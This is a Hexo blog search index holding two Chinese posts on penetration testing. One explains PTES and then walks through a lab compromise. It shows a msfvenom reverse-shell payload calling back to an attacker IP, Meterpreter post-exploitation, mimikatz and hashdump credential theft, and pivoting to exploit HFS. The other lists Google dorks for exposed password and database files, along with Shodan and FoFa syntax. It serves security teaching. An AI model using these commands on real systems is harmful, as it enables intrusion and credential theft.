<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[后渗透攻击_如何取得一台服务器的控制权限]]></title>
    <url>%2Faisnnu.github.io%2Funcategorized%2F%E5%90%8E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB-%E5%A6%82%E4%BD%95%E5%8F%96%E5%BE%97%E4%B8%80%E5%8F%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90%2F</url>
    <content type="text"><![CDATA[渗透测试就是一种通过模拟恶意攻击者的技术和方法，挫败目标系统安全控制措施，取得访问控制权，并发现具备业务影响后果安全隐患的一种安全测试与评估方法。 渗透测试过程一般需要对目标系统进行主动探测分析，以发现潜在的系统漏洞，包括不恰当的系统配置，已知或未知的软硬件漏洞，以及在安全计划与响应过程中的操作性弱点等。而这一过程需要以攻击者的角度进行实施，通常涉及对大量发现安全漏洞的主动渗透与入侵攻击。渗透测试中发现的所有安全问题，他们所带来的业务影响后果评估，以及如何避免这些问题的技术解决方案，将最终报告中呈现给目标系统的拥有者，帮助他们修补并提升系统的安全性。 渗透测试的种类黑盒测试渗透测试团队将从一个远程网络位置来评估目标网络基础设施，并没有任何目标网络内部拓扑等相关信息，他们完全模拟真实网络环境中的攻击者，采用流行的攻击技术与工具，有组织有步骤地对目标进行逐步地渗透与入侵，揭示目标网络中一些已知或未知的安全漏洞，并评估这些漏洞能否被利用获取控制权或造成业务资产的损失。 黑盒测试还可以对目标组织内部安全团队的检测与响应能力做出评估。 黑盒测试是比较费时费力的，同时需要渗透测试者具备较高的技术能力。 白盒测试进行白盒测试的团队将可以了解到关于目标环境的所有内部与底层知识，因此这可以让渗透测试者以最小的代价发现和验证系统中最严重的安全漏洞。如果实施到位，白盒测试能够比黑盒测试消除更多的目标基础设施环境中的安全漏洞和弱点。 白盒测试无须进行目标定位和情报搜集。 白盒测试能够更加方便的在一次常规的开发与部署计划周期中集成。 白盒测试中发现和解决安全漏洞所需花费的时间和代价要比黑盒测试少许多。 白盒测试无法有效地测试客户组织的应急响应措施，也无法判断出他们的安全防护计划对检测特定攻击的效率。 渗透测试方法论-PTESPTES 渗透测试执行标准是由安全业界多家领军企业技术专家所共同发起的，期望为企业组织与安全服务提供商设计并制定用来实施渗透测试的通用准则。 PTES 标准项目网站为[http://www.pentest-standard.org]。 PTES 标准中定义的渗透测试过程环节基本上反映了安全业界的普遍认同，具体包括以下7个阶段。 前期交互阶段Pre-Engagement Interaction 在前期交互阶段，渗透测试团队与客户组织进行交互讨论，最重要的是确定渗透测试的范围、目标、限制条件以及服务合同细节。 该阶段通常涉及收集客户需求、准备测试计划、定义测试范围与边界、定义业务目标、项目管理与规划等活动。 情报搜集阶段Information Gathering 渗透测试团队可以利用各种信息来源于搜集技术方法，尝试获取更多关于目标组织网络拓扑、系统配置与安全防御措施的信息。 收集信息的方法包括公开来源信息查询、Google Hacking、社会工程学、网络踩点、扫描探测、被动监听、服务查点等。 威胁建模阶段Threat Modeling 针对获取的信息进行威胁建模与攻击规划。通过团队共同的缜密情报分析与攻击思路头脑风暴，可以从大量的信息中理清头绪，切丁最可行的攻击通道。 漏洞分析阶段Vulnerability Analysis 在确定出最可行的攻击通道之后，接下来需要考虑该如何获取目标系统的访问控制权。 渗透测试者需要综合分析前几个阶段获取并汇总的情报信息，特别是安全漏洞扫描结果、服务查点信息等，通过搜索可获取的渗透代码资源，找出可以实施渗透攻击的攻击点，并在实验环境中进行验证。 在该阶段，高水平的渗透测试团队还会针对攻击通道上的一些管家你系统与服务进行安全漏洞探测与挖掘，期望找出可被利用的未知安全漏洞，并开发出渗透代码，从而打开攻击通道上的关键路径。 渗透攻击阶段Exploitation 在此环节中，渗透测试团队需要利用它们所找出的目标系统安全漏洞，来真正入侵系统当中，获得访问控制权。 渗透测试者还需要充分地考虑目标系统特性来定制渗透攻击，并需要挫败目标网络与系统中实施的安全防御措施，才能成功达成渗透目的。 在黑盒测试中，渗透测试者还需要考虑对目标系统检测机制的逃逸，从而避免造成目标组织安全响应团队的警觉和发现。 后渗透攻击阶段Post Exploitation 在这个环节中，需要渗透测试团队根据目标的业务经营模式、保护资产形式与安全防御计划的不同特点，自主设计出攻击目标，识别关键基础设施，并寻找客户最具价值的尝试安全防护的信息和资产，最终达成能够对客户造成最重要业务影响的攻击途径 后渗透攻击的目标和途径是千变万化的。 报告阶段Reporting 渗透测试过程最终需要向客户提交，取得认可并成功获得合同付款就是一份渗透测试报告。 这份报告凝聚了之前所有阶段之中渗透测试团队所获取的管家你情报信息、探测和发掘出的系统安全漏洞、成功渗透攻击的过程，以及造成业务影响后果的攻击途径，同时还要站在防御者的角度上，帮助他们分析安全防御体系中的薄弱环节、存在的问题以及修补与升级方案。 实战：后渗透攻击目标网站使用浏览器打开测试站点[http://www.test.com] 信息搜集IP 收集使用ping 命令初步判定ip 地址为10.10.10.201，但是显示请求超时，目标网站可能有防火墙设置。 网站技术架构识别根据HTTP 报文的响应头部，可以初步判断网站技术架构。 通过浏览网站信息，发现该网站使用meinfo，并且他的版本号码是5.0.4。 漏洞分析与利用metinfov5.0.4 存在文件上传漏洞，可以直接使用提前写好的脚本GetShell。 Shell 地址为[http://www.test.com/upload/file/1544783891.php]。输入密码[admin]，即可进入大马。 后渗透后渗透就是就是扩大渗透攻击的深度与广度。其中涉及到目标系统重要资产发现，权限提升，维持访问等等操作。 查看开放的端口发现Web 服务器上开放的端口如下， 经过简单判断，得到如下信息 用户账户信息查看所有账户 在这里，我们可以创建一个用户并加入到管理员组，但是我个人觉得意义不大。 查看IP 地址在WebShell 中，查看IP 地址发现是[192.168.1.100]，这跟域名解析出来的地址不同。说明Web 服务器有可能在内网中。并且网关是[192.168.1.254]。 这里面我们是没有办法与192.168.1.100 直接进行通信的。我们尝试一下内网能否访问我们。嗯，可以访问，问题不大。 我们可以尝试反弹Shell ，并且使用强大的后渗透工具–Meterpreter。 反弹Shell制作反弹Shell exe 文件 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.197 LPORT=4444 -f exe -o payload.exe 配置MSF具体命令如下123456msf &gt; use exploit/multi/handler msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(multi/handler) &gt; set LHOST 10.10.10.197 LHOST =&gt; 10.10.10.197msf exploit(multi/handler) &gt; exploit 将生成的payload.exe 文件直接上传到目标服务器，直接运行，就可以得到Meterpreter 会话。此时我们的后渗透攻击之旅，才刚刚开始。这个Meterpreter 会话的ID 是1 ，这个是由payload.exe 文件反弹回来的Shell，如果进程结束，会丢失该会话。 迁移进程 ps查看系统进程 migrate 3724 信息收集我们可以进一步收集Web 服务器192.168.1.100 的相关信息。 权限查看 getuid 系统信息systinfo 网络信息 是否虚拟机run post/windows/gather/checkvm 补丁信息run post/windows/gather/enum_patches 信息搜集的脚本比较多，以下列出几个。123456789run post/windows/gather/checkvm #是否虚拟机run post/linux/gather/checkvm #是否虚拟机run post/windows/gather/forensics/enum_drives #查看分区run post/windows/gather/enum_applications #获取安装软件信息run post/windows/gather/dumplinks #获取最近的文件操作run post/windows/gather/enum_ie #获取IE缓存run post/windows/gather/enum_chrome #获取Chrome缓存run post/windows/gather/enum_patches #补丁信息run post/windows/gather/enum_domain #查找域控 抓取明文密码导入神器load mimikatz 导出密码 kerberos 我们可以导出目标服务器的用户名和密码[Administrator/http://123.com] 远程桌面与截屏run vnc 直接登录目标服务器。 还有很多命令如下 123456enumdesktops #查看可用的桌面getdesktop #获取当前meterpreter 关联的桌面set_desktop #设置meterpreter关联的桌面 -h查看帮助screenshot #截屏use espia #或者使用espia模块截屏 然后输入screengrabrun vnc #使用vnc远程桌面连接 到此为止，这台服务器已经完全在我们的掌控之中。 扩大战果查看arp 缓存 arp 查看路由信息route 添加路由run autoroute -s 192.168.1.0/24 查看添加的路由信息run autoroute -p 端口扫描发现目标开启了80 端口 版本信息测探 再次渗透攻击我们发现[192.168.1.200] 这台机器上80 端口运行着HFS 服务。这个[HFS 2.3 beta]版本存在远程代码执行漏洞。我们可以再次发起渗透攻击。 切入会话 5 查看权限 getuid 尝试提权 getsystem 进程迁移 migrate 12 尝试导出账户hash值 run hashdump 查看IP 信息关键信息如下 开启远程桌面连接run post/windows/manage/enable_rdp 添加用户 端口转发portfwd add -l 33891 -p 3389 -r 127.0.0.1 远程桌面登录 登录成功]]></content>
      <tags>
        <tag>后渗透攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试神器——搜索引擎]]></title>
    <url>%2Faisnnu.github.io%2Funcategorized%2Fhexo-NexT%2F</url>
    <content type="text"><![CDATA[搜索引擎是我日常工作中用得最多的一款工具，国内常用的搜索引擎包括Baidu，sougou，bing等。但我本篇要纪录的并不是这些常用的搜索引擎，而是信息安全从业人员必备的几款网络搜索引擎。本篇要介绍的搜索引擎包括：Shodan，censys，钟馗之眼，Google，FoFa，Dnsdb等。介绍的内容主要是这几款搜索引擎的一些高级语法，掌握高级语法会让搜索结果更准确。 Google搜索引擎这里之所以要介绍google搜索引擎，是因为它有别于百度、搜狗等内容搜索引擎，其在安全界有着非同一般的地位，甚至专门有一名词为google hacking用来形容google与安全非同寻常的关系。 google基本语法Index of/ 使用它可以直接进入网站首页下的所有文件和文件夹中。intext: 将返回所有在网页正文部分包含关键词的网页。intitle: 将返回所有网页标题中包含关键词的网页。cache: 搜索google里关于某些内容的缓存。define: 搜索某个词语的定义。filetype: 搜索指定的文件类型，如：.bak，.mdb，.inc等。info: 查找指定站点的一些基本信息。inurl: 搜索我们指定的字符是否存在于URL中。Link: link:thief.one可以返回所有和thief.one做了链接的URL。site: site:thief.one将返回所有和这个站有关的URL。+ 把google可能忽略的字列如查询范围。- 把某个字忽略，例子：新加 -坡。~ 同意词。. 单一的通配符。* 通配符，可代表多个字母。“” 精确查询。 搜索不同国家网站inurl:tw 台湾inurl:jp 日本 利用google暴库利用goole可以搜索到互联网上可以直接下载到的数据库文件，语法如下： inurl:editor/db/ inurl:eWebEditor/db/ inurl:bbs/data/ inurl:databackup/ inurl:blog/data/ inurl:\boke\data inurl:bbs/database/ inurl:conn.asp inc/conn.asp Server.mapPath(“.mdb”) allinurl:bbs data filetype:mdb inurl:database filetype:inc conn inurl:data filetype:mdb intitle:”index of” data 利用goole搜索敏感信息利用google可以搜索一些网站的敏感信息，语法如下: intitle:”index of” etc intitle:”Index of” .sh_history intitle:”Index of” .bash_history intitle:”index of” passwd intitle:”index of” people.lst intitle:”index of” pwd.db intitle:”index of” etc/shadow intitle:”index of” spwd intitle:”index of” master.passwd intitle:”index of” htpasswd inurl:service.pwd 利用google搜索C段服务器信息site:218.87.21.* 可通过google可获取218.87.21.0/24网络的服务信息。 shodan搜索引擎shodan网络搜索引擎偏向网络设备以及服务器的搜索，具体内容可上网查阅，这里给出它的高级搜索语法。 地址：https://www.shodan.io/ shodan搜索语法hostname： 搜索指定的主机或域名，例如 hostname:”google” port： 搜索指定的端口或服务，例如 port:”21” country： 搜索指定的国家，例如 country:”CN” city： 搜索指定的城市，例如 city:”Hefei” org： 搜索指定的组织或公司，例如 org:”google” isp： 搜索指定的ISP供应商，例如 isp:”China Telecom” product： 搜索指定的操作系统/软件/平台，例如 product:”Apache httpd” version： 搜索指定的软件版本，例如 version:”1.6.2” geo： 搜索指定的地理位置，例如 geo:”31.8639, 117.2808” before/after： 搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:”11-11-15” net： 搜索指定的IP地址或子网，例如 net:”210.45.240.0/24” 以上内容参考：http://xiaix.me/shodan-xin-shou-ru-keng-zhi-nan/ censys搜索引擎censys搜索引擎功能与shodan类似，以下几个文档信息。 地址：https://www.censys.io/ https://www.censys.io/certificates/help 帮助文档 https://www.censys.io/ipv4?q= ip查询 https://www.censys.io/domain?q= 域名查询 https://www.censys.io/certificates?q= 证书查询 censys搜索语法默认情况下censys支持全文检索。 23.0.0.0/8 or 8.8.8.0/24 可以使用and or not 80.http.get.status_code: 200 指定状态 80.http.get.status_code:[200 TO 300] 200-300之间的状态码 location.country_code: DE 国家 protocols: (“23/telnet” or “21/ftp”) 协议 tags: scada 标签 80.http.get.headers.server：nginx 服务器类型版本 autonomous_system.description: University 系统描述 zoomeye钟馗之眼钟馗之眼搜索引擎偏向web应用层面的搜索。 地址：https://www.zoomeye.org/ zoomeye钟馗之眼搜索语法app:nginx 组件名 ver:1.0 版本 os:windows 操作系统 country:”China” 国家 city:”hangzhou” 城市 port:80 端口 hostname:google 主机名 site:thief.one 网站域名 desc:nmask 描述 keywords:nmask’blog 关键词 service:ftp 服务类型 ip:8.8.8.8 ip地址 cidr:8.8.8.8/24 ip地址段 FoFa搜索引擎FoFa搜索引擎偏向资产搜索。 地址：https://fofa.so FoFa搜索语法title=”abc” 从标题中搜索abc。例：标题中有北京的网站。 header=”abc” 从http头中搜索abc。例：jboss服务器。 body=”abc” 从html正文中搜索abc。例：正文包含Hacked by。 domain=”qq.com” 搜索根域名带有qq.com的网站。例： 根域名是qq.com的网站。 host=”.gov.cn” 从url中搜索.gov.cn,注意搜索要用host作为名称。 port=”443” 查找对应443端口的资产。例： 查找对应443端口的资产。 ip=”1.1.1.1” 从ip中搜索包含1.1.1.1的网站,注意搜索要用ip作为名称。 protocol=”https” 搜索制定协议类型(在开启端口扫描的情况下有效)。例： 查询https协议资产。 city=”Beijing” 搜索指定城市的资产。例： 搜索指定城市的资产。 region=”Zhejiang” 搜索指定行政区的资产。例： 搜索指定行政区的资产。 country=”CN” 搜索指定国家(编码)的资产。例： 搜索指定国家(编码)的资产。 cert=”google.com” 搜索证书(https或者imaps等)中带有google.com的资产。 高级搜索：title=”powered by” &amp;&amp; title!=discuz title!=”powered by” &amp;&amp; body=discuz ( body=”content=\”WordPress” || (header=”X-Pingback” &amp;&amp; header=”/xmlrpc.php” &amp;&amp; body=”/wp-includes/“) ) &amp;&amp; host=”gov.cn” Dnsdb搜索引擎dnsdb搜索引擎是一款针对dbs解析的查询平台。 地址：https://www.dnsdb.io/ Dnsdb搜索语法DnsDB查询语法结构为条件1 条件2 条件3 …., 每个条件以空格间隔, DnsDB 会 把满足所有查询条件的结果返回给用户. 域名查询条件域名查询是指查询顶级私有域名所有的DNS记录, 查询语法为domain:. 例如查询google.com 的所有DNS记录: domain:google.com. 域名查询可以省略domain:. 主机查询条件查询语法:host: 例如查询主机地址为mp3.example.com的DNS记录: host:map3.example.com 主机查询条件与域名查询查询条件的区别在于, 主机查询匹配的是DNS记录的Host值 按DNS记录类型查询查询语法: type:.例如只查询A记录: type:a使用条件:必须存在domain:或者host:条件,才可以使用type:查询语法 按IP限制查询语法: ip:查询指定IP: ip:8.8.8.8, 该查询与直接输入8.8.8.8进行查询等效查询指定IP范围: ip:8.8.8.8-8.8.255.255CIDR: ip:8.8.0.0/24IP最大范围限制65536个]]></content>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
</search>
